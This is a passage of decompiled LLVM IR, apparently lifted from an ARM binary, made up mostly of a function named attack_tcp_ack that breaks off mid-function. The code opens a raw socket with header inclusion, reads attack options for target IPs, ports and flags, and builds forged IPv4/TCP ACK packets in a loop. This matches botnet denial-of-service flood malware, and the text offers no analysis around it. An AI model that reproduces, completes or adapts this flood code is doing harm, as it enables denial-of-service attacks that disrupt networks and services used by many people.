  uselistorder i1 %v2_a844, { 2, 3, 1, 0 }
  uselistorder i32 %v0_a654, { 1, 0 }
  uselistorder i32 %v0_a58c, { 1, 0 }
  uselistorder i32 %v5_a520, { 1, 0 }
  uselistorder i32 %v0_a4e0, { 1, 0 }
  uselistorder i32 %v0_a49c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_a44c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_a438, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_a3c4, { 1, 0 }
  uselistorder i32 %v6_a3bc, { 0, 2, 1, 3 }
  uselistorder i1 %v9_a3ec, { 1, 0 }
  uselistorder i32 %v4_a400, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_a348, { 1, 0, 2 }
  uselistorder i32 %v0_a4f8, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_a338, { 1, 0 }
  uselistorder i1 %v7_a330, { 1, 0, 2 }
  uselistorder i1 %v7_a2e4, { 1, 0 }
  uselistorder i32 %v3_a2e0, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_a6c0, { 1, 0 }
  uselistorder i32 %v1_a6a8, { 1, 0 }
  uselistorder i32 %v1_a690, { 1, 0 }
  uselistorder i32 %v1_a678, { 1, 0 }
  uselistorder i32 %v1_a660, { 1, 0 }
  uselistorder i32 %v3_a3f8, { 1, 0 }
  uselistorder i1 %v2_a414, { 1, 0 }
  uselistorder i32 %v1_a410, { 1, 0 }
  uselistorder i32 %v4_a40c, { 2, 0, 1 }
  uselistorder i32 %v2_a320, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_a2bc, { 1, 0 }
  uselistorder i1 %v7_a2b4, { 1, 0 }
  uselistorder i1 %v7_a288, { 1, 0 }
  uselistorder i32 %v3_a284, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_a270, { 2, 3, 1, 0 }
  uselistorder i32 %v6_a250, { 9, 8, 2, 0, 1, 10, 5, 4, 6, 7, 3 }
  uselistorder i32 %v1_a238, { 1, 2, 0 }
  uselistorder i32 %v1_a218, { 1, 2, 0 }
  uselistorder i32 %v1_a1f8, { 1, 2, 0 }
  uselistorder i32 %v1_a1d8, { 1, 2, 0 }
  uselistorder i32 %v1_a1b8, { 1, 2, 0 }
  uselistorder i32 %v1_a198, { 1, 2, 0 }
  uselistorder i32 %v6_a174, { 1, 0 }
  uselistorder i32 %v1_a15c, { 1, 2, 0 }
  uselistorder i32 %v6_a0f4, { 2, 1, 3, 0 }
  uselistorder i32 %v2_a0dc, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v2_a0cc, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 45, 47, 46, 48, 50, 49, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 6, 9, 8, 11, 10, 16, 12, 13, 14, 15, 19, 17, 18, 21, 20, 22, 25, 24, 23, 26, 27, 28, 30, 31, 29, 32, 34, 33, 35, 36, 37, 39, 38, 40, 42, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 0, 16, 17, 14, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg2, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a758, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a72c, { 1, 0 }
  uselistorder label %dec_label_pc_a71c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a70c, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
  uselistorder label %dec_label_pc_a478, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a448, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a384, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_a364, { 1, 0 }
  uselistorder label %dec_label_pc_a340, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_a2f0, { 1, 0 }
  uselistorder label %dec_label_pc_a2d4, { 1, 0 }
}

define i32 @attack_tcp_ack(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_a864 = load i32, i32* @sb, align 4
  %v24_a864 = load i32, i32* @fp, align 4
  %v27_a864 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_a880 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_a884 = load i32, i32* @r5, align 4
  store i32 %v0_a884, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a894 = load i32, i32* @r4, align 4
  store i32 %v0_a894, i32* %r0.global-to-local, align 4
  %v5_a898 = inttoptr i32 %v0_a884 to i32*
  %v6_a898 = call i32 @attack_get_opt_int(i32 %v0_a894, i32* %v5_a898, i32 2, i32 0, i32 %v2_a880)
  %v1_a8a4 = urem i32 %v6_a898, 256
  store i32 %v1_a8a4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a8b0 = load i32, i32* @r5, align 4
  store i32 %v0_a8b0, i32* %r1.global-to-local, align 4
  %v0_a8b4 = load i32, i32* @r4, align 4
  store i32 %v0_a8b4, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v6_a898, 16777216
  %v5_a8bc = sdiv i32 %sext, 16777216
  %v6_a8bc = inttoptr i32 %v0_a8b0 to i32*
  %v7_a8bc = call i32 @attack_get_opt_int(i32 %v0_a8b4, i32* %v6_a8bc, i32 3, i32 65535, i32 %v5_a8bc)
  %v0_a8c0 = load i32, i32* @r5, align 4
  store i32 %v0_a8c0, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_a8bc, i32* %sb.global-to-local, align 4
  %v0_a8d0 = load i32, i32* @r4, align 4
  store i32 %v0_a8d0, i32* %r0.global-to-local, align 4
  %v5_a8d4 = inttoptr i32 %v0_a8c0 to i32*
  %v6_a8d4 = call i32 @attack_get_opt_int(i32 %v0_a8d0, i32* %v5_a8d4, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_a8dc = urem i32 %v6_a8d4, 256
  store i32 %v1_a8dc, i32* %ip.global-to-local, align 4
  %v0_a8e0 = load i32, i32* @r5, align 4
  store i32 %v0_a8e0, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a8ec = load i32, i32* @r4, align 4
  store i32 %v0_a8ec, i32* %r0.global-to-local, align 4
  %sext4 = mul i32 %v6_a8d4, 16777216
  %v5_a8f4 = sdiv i32 %sext4, 16777216
  %v6_a8f4 = inttoptr i32 %v0_a8e0 to i32*
  %v7_a8f4 = call i32 @attack_get_opt_int(i32 %v0_a8ec, i32* %v6_a8f4, i32 5, i32 0, i32 %v5_a8f4)
  %v1_a900 = urem i32 %v7_a8f4, 256
  store i32 %v1_a900, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a90c = load i32, i32* @r5, align 4
  store i32 %v0_a90c, i32* %r1.global-to-local, align 4
  %v0_a910 = load i32, i32* @r4, align 4
  store i32 %v0_a910, i32* %r0.global-to-local, align 4
  %v5_a918 = inttoptr i32 %v0_a90c to i32*
  %v6_a918 = call i32 @attack_get_opt_int(i32 %v0_a910, i32* %v5_a918, i32 6, i32 65535, i32 %v1_a900)
  %v0_a920 = load i32, i32* @r5, align 4
  store i32 %v0_a920, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_a918, i32* @r6, align 4
  %v0_a930 = load i32, i32* @r4, align 4
  store i32 %v0_a930, i32* %r0.global-to-local, align 4
  %v5_a934 = inttoptr i32 %v0_a920 to i32*
  %v6_a934 = call i32 @attack_get_opt_int(i32 %v0_a930, i32* %v5_a934, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_a93c = load i32, i32* @r5, align 4
  store i32 %v0_a93c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v6_a934, i32* @sl, align 4
  %v0_a94c = load i32, i32* @r4, align 4
  store i32 %v0_a94c, i32* %r0.global-to-local, align 4
  %v5_a950 = inttoptr i32 %v0_a93c to i32*
  %v6_a950 = call i32 @attack_get_opt_int(i32 %v0_a94c, i32* %v5_a950, i32 17, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_a95c = load i32, i32* @r5, align 4
  store i32 %v0_a95c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_a968 = load i32, i32* @r4, align 4
  store i32 %v0_a968, i32* %r0.global-to-local, align 4
  %v5_a96c = inttoptr i32 %v0_a95c to i32*
  %v6_a96c = call i32 @attack_get_opt_int(i32 %v0_a968, i32* %v5_a96c, i32 18, i32 65535, i32 %v6_a950)
  %v0_a970 = load i32, i32* @r5, align 4
  store i32 %v0_a970, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a980 = load i32, i32* @r4, align 4
  store i32 %v0_a980, i32* %r0.global-to-local, align 4
  %v5_a984 = inttoptr i32 %v0_a970 to i32*
  %v6_a984 = call i32 @attack_get_opt_int(i32 %v0_a980, i32* %v5_a984, i32 11, i32 0, i32 %v6_a96c)
  %v0_a988 = load i32, i32* @r5, align 4
  store i32 %v0_a988, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a998 = load i32, i32* @r4, align 4
  store i32 %v0_a998, i32* %r0.global-to-local, align 4
  %v5_a99c = inttoptr i32 %v0_a988 to i32*
  %v6_a99c = call i32 @attack_get_opt_int(i32 %v0_a998, i32* %v5_a99c, i32 12, i32 1, i32 %v6_a984)
  %v0_a9a0 = load i32, i32* @r5, align 4
  store i32 %v0_a9a0, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a9b0 = load i32, i32* @r4, align 4
  store i32 %v0_a9b0, i32* %r0.global-to-local, align 4
  %v5_a9b4 = inttoptr i32 %v0_a9a0 to i32*
  %v6_a9b4 = call i32 @attack_get_opt_int(i32 %v0_a9b0, i32* %v5_a9b4, i32 13, i32 0, i32 %v6_a99c)
  %v0_a9b8 = load i32, i32* @r5, align 4
  store i32 %v0_a9b8, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a9c8 = load i32, i32* @r4, align 4
  store i32 %v0_a9c8, i32* %r0.global-to-local, align 4
  %v5_a9cc = inttoptr i32 %v0_a9b8 to i32*
  %v6_a9cc = call i32 @attack_get_opt_int(i32 %v0_a9c8, i32* %v5_a9cc, i32 14, i32 0, i32 %v6_a9b4)
  %v0_a9d0 = load i32, i32* @r5, align 4
  store i32 %v0_a9d0, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a9e0 = load i32, i32* @r4, align 4
  store i32 %v0_a9e0, i32* %r0.global-to-local, align 4
  %v5_a9e4 = inttoptr i32 %v0_a9d0 to i32*
  %v6_a9e4 = call i32 @attack_get_opt_int(i32 %v0_a9e0, i32* %v5_a9e4, i32 15, i32 0, i32 %v6_a9cc)
  %v0_a9e8 = load i32, i32* @r5, align 4
  store i32 %v0_a9e8, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a9f8 = load i32, i32* @r4, align 4
  store i32 %v0_a9f8, i32* %r0.global-to-local, align 4
  %v5_a9fc = inttoptr i32 %v0_a9e8 to i32*
  %v6_a9fc = call i32 @attack_get_opt_int(i32 %v0_a9f8, i32* %v5_a9fc, i32 16, i32 0, i32 %v6_a9e4)
  %v0_aa00 = load i32, i32* @r5, align 4
  store i32 %v0_aa00, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_aa10 = load i32, i32* @r4, align 4
  store i32 %v0_aa10, i32* %r0.global-to-local, align 4
  %v5_aa14 = inttoptr i32 %v0_aa00 to i32*
  %v6_aa14 = call i32 @attack_get_opt_int(i32 %v0_aa10, i32* %v5_aa14, i32 0, i32 512, i32 %v6_a9fc)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_aa24 = load i32, i32* @r5, align 4
  store i32 %v0_aa24, i32* %r1.global-to-local, align 4
  %v0_aa28 = load i32, i32* @r4, align 4
  store i32 %v0_aa28, i32* %r0.global-to-local, align 4
  %v5_aa2c = inttoptr i32 %v0_aa24 to i32*
  %v6_aa2c = call i32 @attack_get_opt_int(i32 %v0_aa28, i32* %v5_aa2c, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v2_aa38 = load i32, i32* @global_var_2471c.58, align 4
  store i32 %v2_aa38, i32* %r3.global-to-local, align 4
  %v1_aa3c = urem i32 %v6_aa2c, 256
  store i32 %v1_aa3c, i32* %ip.global-to-local, align 4
  %v0_aa40 = load i32, i32* @r5, align 4
  store i32 %v0_aa40, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_aa48 = load i32, i32* @r4, align 4
  store i32 %v0_aa48, i32* %r0.global-to-local, align 4
  %v5_aa50 = inttoptr i32 %v0_aa40 to i32*
  %v6_aa50 = call i32 @attack_get_opt_ip(i32 %v0_aa48, i32* %v5_aa50, i32 25, i32 %v2_aa38, i32 %v1_aa3c)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_aa64 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_aa64, i32* %r0.global-to-local, align 4
  %v7_aa68 = icmp eq i32 %v3_aa64, -1
  store i1 %v7_aa68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aa68, label %dec_label_pc_af30, label %dec_label_pc_aa74

dec_label_pc_aa74:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_aa7c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_aa7c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_aa90 = call i32 @__GI_setsockopt(i32 %v3_aa64, i32 0, i32 3, i32 %v6_aa7c, i32 4)
  store i32 %v5_aa90, i32* %r0.global-to-local, align 4
  %v7_aa94 = icmp eq i32 %v5_aa90, -1
  store i1 %v7_aa94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aa94, label %dec_label_pc_af28, label %dec_label_pc_aa9c

dec_label_pc_aa9c:                                ; preds = %dec_label_pc_aa74
  %v0_aa9c = load i32, i32* %sb.global-to-local, align 4
  %v3_aa9c = mul i32 %v0_aa9c, 65536
  store i32 %v3_aa9c, i32* @r5, align 4
  %v0_aaa0 = load i32, i32* @r6, align 4
  %v0_aaa4 = load i32, i32* @sl, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_aaac = urem i32 %v0_aa9c, 65536
  store i32 %v3_aaac, i32* %r1.global-to-local, align 4
  %v3_aab0 = urem i32 %v0_aaa0, 65536
  store i32 %v3_aab0, i32* %r2.global-to-local, align 4
  %v3_aab4 = urem i32 %v0_aaa4, 65536
  store i32 %v3_aab4, i32* %r3.global-to-local, align 4
  %v0_aab8 = load i32, i32* @r7, align 4
  %v2_aab8 = icmp eq i32 %v0_aab8, 0
  store i1 %v2_aab8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_aab8, label %dec_label_pc_af3c, label %dec_label_pc_aad0

dec_label_pc_aad0:                                ; preds = %dec_label_pc_aa9c
  %v3_aad4 = mul i32 %v6_aa14, 65536
  %v1_aad8 = add i32 %v3_aad4, 2621440
  store i32 %v1_aad8, i32* @lr, align 4
  %tmp59 = mul i32 %v0_aaa0, 256
  %v3_aafc = and i32 %tmp59, 65280
  %tmp60 = mul i32 %v0_aaa4, 256
  %v3_ab00 = and i32 %tmp60, 65280
  %tmp61 = udiv i32 %v0_aaa0, 256
  %v4_ab04 = urem i32 %tmp61, 256
  %v5_ab04 = or i32 %v4_ab04, %v3_aafc
  store i32 %v5_ab04, i32* @r6, align 4
  %tmp62 = udiv i32 %v0_aaa4, 256
  %v4_ab08 = urem i32 %tmp62, 256
  %v5_ab08 = or i32 %v4_ab08, %v3_ab00
  store i32 %v5_ab08, i32* @sl, align 4
  %tmp63 = udiv i32 %v1_aad8, 256
  %v3_ab1c = and i32 %tmp63, 65280
  %tmp64 = mul i32 %v0_aa9c, 256
  %v3_ab20 = and i32 %tmp64, 65280
  %tmp65 = mul i32 %v6_a950, 256
  %v3_ab24 = and i32 %tmp65, 65280
  %v1_ab28 = urem i32 %v6_a984, 2
  %v1_ab2c = urem i32 %v6_a99c, 2
  %tmp66 = udiv i32 %v6_a950, 256
  %v4_ab30 = urem i32 %tmp66, 256
  %v5_ab30 = or i32 %v4_ab30, %v3_ab24
  %v4_ab34 = udiv i32 %v1_aad8, 16777216
  %v5_ab34 = or i32 %v3_ab1c, %v4_ab34
  store i32 %v5_ab34, i32* @sb, align 4
  %tmp67 = udiv i32 %v0_aa9c, 256
  %v4_ab38 = urem i32 %tmp67, 256
  %v5_ab38 = or i32 %v4_ab38, %v3_ab20
  store i32 %v5_ab38, i32* @fp, align 4
  %v1_ab54 = urem i32 %v6_a9b4, 2
  store i32 %v1_ab54, i32* %r2.global-to-local, align 4
  %v1_ab58 = urem i32 %v6_a9cc, 2
  store i32 %v1_ab58, i32* %r3.global-to-local, align 4
  %v1_ab5c = urem i32 %v6_a9e4, 2
  store i32 %v1_ab5c, i32* %ip.global-to-local, align 4
  %v1_ab60 = urem i32 %v6_a9fc, 2
  store i32 %v1_ab60, i32* %r0.global-to-local, align 4
  %v1_ab64 = urem i32 %v6_a9b4, 256
  store i32 %v1_ab64, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %tmp = sub nsw i32 0, %v1_ab2c
  %v4_ac50 = and i32 %tmp, 16
  %tmp72 = sub nsw i32 0, %v1_ab54
  %v4_ac6c = and i32 %tmp72, 8
  %tmp73 = sub nsw i32 0, %v1_ab58
  %v4_ac80 = and i32 %tmp73, 4
  %tmp74 = sub nsw i32 0, %v1_ab5c
  %v3_ac94 = and i32 %tmp74, 2
  %v2_acb8 = icmp eq i32 %v1_ab64, 0
  %v1_abe0 = trunc i32 %v5_a8bc to i8
  %extract.t = trunc i32 %v5_a8f4 to i8
  br label %dec_label_pc_ab84

dec_label_pc_ab84:                                ; preds = %bb70, %dec_label_pc_aad0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_ab90 = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_ab90, i32* %r0.global-to-local, align 4
  %v2_ab98 = load i32, i32* @r4, align 4
  %v5_ab98 = mul i32 %v2_ab98, 4
  %v6_ab98 = add i32 %v5_ab98, %v2_a880
  %v7_ab98 = inttoptr i32 %v6_ab98 to i32*
  store i32 %v2_ab90, i32* %v7_ab98, align 4
  %v3_ab9c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ab9c, i32* %r2.global-to-local, align 4
  %v5_aba4 = mul i32 %v3_ab9c, 24
  %v1_aba8 = load i32, i32* @r8, align 4
  %v2_aba8 = add i32 %v1_aba8, %v5_aba4
  store i32 %v2_aba8, i32* %r1.global-to-local, align 4
  store i32 %v2_a880, i32* %r3.global-to-local, align 4
  %v4_abb0 = mul i32 %v3_ab9c, 4
  %v5_abb0 = add i32 %v4_abb0, %v2_a880
  %v6_abb0 = inttoptr i32 %v5_abb0 to i32*
  %v7_abb0 = load i32, i32* %v6_abb0, align 4
  store i32 %v7_abb0, i32* @r5, align 4
  %v1_abb4 = inttoptr i32 %v7_abb0 to i8*
  %v2_abb4 = load i8, i8* %v1_abb4, align 1
  %tmp75 = urem i8 %v2_abb4, 16
  %v1_abb8 = zext i8 %tmp75 to i32
  %v1_abbc = or i32 %v1_abb8, 64
  store i32 %v1_abbc, i32* %r3.global-to-local, align 4
  %v1_abc0 = trunc i32 %v1_abbc to i8
  store i8 %v1_abc0, i8* %v1_abb4, align 1
  %v0_abc4 = load i32, i32* @r5, align 4
  %v1_abc4 = inttoptr i32 %v0_abc4 to i8*
  %v2_abc4 = load i8, i8* %v1_abc4, align 1
  %v1_abc8 = and i8 %v2_abc4, -16
  %v1_abcc = or i8 %v1_abc8, 5
  store i32 %v1_a900, i32* %ip.global-to-local, align 4
  store i8 %v1_abcc, i8* %v1_abc4, align 1
  store i32 %v5_a8bc, i32* %r0.global-to-local, align 4
  %v0_abdc = load i32, i32* %ip.global-to-local, align 4
  %v2_abdc = icmp eq i32 %v0_abdc, 0
  store i1 %v2_abdc, i1* %cpsr_z.global-to-local, align 1
  %v2_abe0 = load i32, i32* @r5, align 4
  %v3_abe0 = add i32 %v2_abe0, 1
  %v4_abe0 = inttoptr i32 %v3_abe0 to i8*
  store i8 %v1_abe0, i8* %v4_abe0, align 1
  store i32 %v5_a8f4, i32* %r2.global-to-local, align 4
  %v0_abe8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_abe8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_ab84
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_abec = load i32, i32* @r5, align 4
  %v4_abec = add i32 %v3_abec, 6
  %v5_abec = inttoptr i32 %v4_abec to i16*
  store i16 64, i16* %v5_abec, align 2
  %v0_abf4.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t17 = trunc i32 %v0_abf4.pre to i8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_ab84, %bb
  %v0_abf4.off0 = phi i8 [ %extract.t, %dec_label_pc_ab84 ], [ %extract.t17, %bb ]
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_abf4 = load i32, i32* @r5, align 4
  %v3_abf4 = add i32 %v2_abf4, 8
  %v4_abf4 = inttoptr i32 %v3_abf4 to i8*
  store i8 %v0_abf4.off0, i8* %v4_abf4, align 1
  %v0_abf8 = load i32, i32* %r3.global-to-local, align 4
  %v1_abf8 = trunc i32 %v0_abf8 to i8
  %v2_abf8 = load i32, i32* @r5, align 4
  %v3_abf8 = add i32 %v2_abf8, 9
  %v4_abf8 = inttoptr i32 %v3_abf8 to i8*
  store i8 %v1_abf8, i8* %v4_abf8, align 1
  store i32 %v6_aa50, i32* %ip.global-to-local, align 4
  %v1_ac00 = load i32, i32* @r5, align 4
  %v2_ac00 = add i32 %v1_ac00, 12
  %v3_ac00 = inttoptr i32 %v2_ac00 to i32*
  store i32 %v6_aa50, i32* %v3_ac00, align 4
  %v0_ac04 = load i32, i32* %r1.global-to-local, align 4
  %v1_ac04 = add i32 %v0_ac04, 16
  %v2_ac04 = inttoptr i32 %v1_ac04 to i32*
  %v3_ac04 = load i32, i32* %v2_ac04, align 4
  store i32 %v3_ac04, i32* %r3.global-to-local, align 4
  %v0_ac08 = load i32, i32* @sb, align 4
  %v1_ac08 = trunc i32 %v0_ac08 to i16
  %v2_ac08 = load i32, i32* @r5, align 4
  %v3_ac08 = add i32 %v2_ac08, 2
  %v4_ac08 = inttoptr i32 %v3_ac08 to i16*
  store i16 %v1_ac08, i16* %v4_ac08, align 2
  %v0_ac0c = load i32, i32* @fp, align 4
  %v1_ac0c = trunc i32 %v0_ac0c to i16
  %v2_ac0c = load i32, i32* @r5, align 4
  %v3_ac0c = add i32 %v2_ac0c, 4
  %v4_ac0c = inttoptr i32 %v3_ac0c to i16*
  store i16 %v1_ac0c, i16* %v4_ac0c, align 2
  %v0_ac10 = load i32, i32* %r3.global-to-local, align 4
  %v1_ac10 = load i32, i32* @r5, align 4
  %v2_ac10 = add i32 %v1_ac10, 16
  %v3_ac10 = inttoptr i32 %v2_ac10 to i32*
  store i32 %v0_ac10, i32* %v3_ac10, align 4
  %v0_ac14 = load i32, i32* @r6, align 4
  %v1_ac14 = trunc i32 %v0_ac14 to i16
  %v2_ac14 = load i32, i32* @r5, align 4
  %v3_ac14 = add i32 %v2_ac14, 20
  %v4_ac14 = inttoptr i32 %v3_ac14 to i16*
  store i16 %v1_ac14, i16* %v4_ac14, align 2
  %v0_ac18 = load i32, i32* @r5, align 4
  %v1_ac18 = add i32 %v0_ac18, 20
  store i32 %v1_ac18, i32* @r4, align 4
  %v1_ac1c = add i32 %v0_ac18, 32
  %v2_ac1c = inttoptr i32 %v1_ac1c to i8*
  %v3_ac1c = load i8, i8* %v2_ac1c, align 1
  %v4_ac1c = zext i8 %v3_ac1c to i32
  store i32 %v4_ac1c, i32* %r3.global-to-local, align 4
  %v1_ac20 = add i32 %v0_ac18, 33
  %v2_ac20 = inttoptr i32 %v1_ac20 to i8*
  %v3_ac20 = load i8, i8* %v2_ac20, align 1
  %v4_ac20 = zext i8 %v3_ac20 to i32
  store i32 %v1_ab28, i32* %r0.global-to-local, align 4
  %tmp76 = urem i8 %v3_ac1c, 16
  %v1_ac28 = zext i8 %tmp76 to i32
  %v1_ac2c = or i32 %v1_ac28, 80
  store i32 %v1_ac2c, i32* %r3.global-to-local, align 4
  %v1_ac30 = and i32 %v4_ac20, 223
  store i32 %v1_ac30, i32* %r2.global-to-local, align 4
  %v1_ac34 = trunc i32 %v1_ac2c to i8
  store i8 %v1_ac34, i8* %v2_ac1c, align 1
  %v0_ac38 = load i32, i32* %r2.global-to-local, align 4
  %v1_ac38 = load i32, i32* %r0.global-to-local, align 4
  %v4_ac38 = mul i32 %v1_ac38, 32
  %v5_ac38 = or i32 %v4_ac38, %v0_ac38
  store i32 %v5_ac38, i32* %r2.global-to-local, align 4
  store i32 %v5_ab30, i32* %r1.global-to-local, align 4
  %v1_ac40 = trunc i32 %v5_ac38 to i8
  %v2_ac40 = load i32, i32* @r4, align 4
  %v3_ac40 = add i32 %v2_ac40, 13
  %v4_ac40 = inttoptr i32 %v3_ac40 to i8*
  store i8 %v1_ac40, i8* %v4_ac40, align 1
  %v0_ac44 = load i32, i32* @r4, align 4
  %v1_ac44 = add i32 %v0_ac44, 13
  %v2_ac44 = inttoptr i32 %v1_ac44 to i8*
  %v3_ac44 = load i8, i8* %v2_ac44, align 1
  %v4_ac44 = zext i8 %v3_ac44 to i32
  store i32 %v1_ab2c, i32* %r2.global-to-local, align 4
  %v1_ac4c = and i32 %v4_ac44, 239
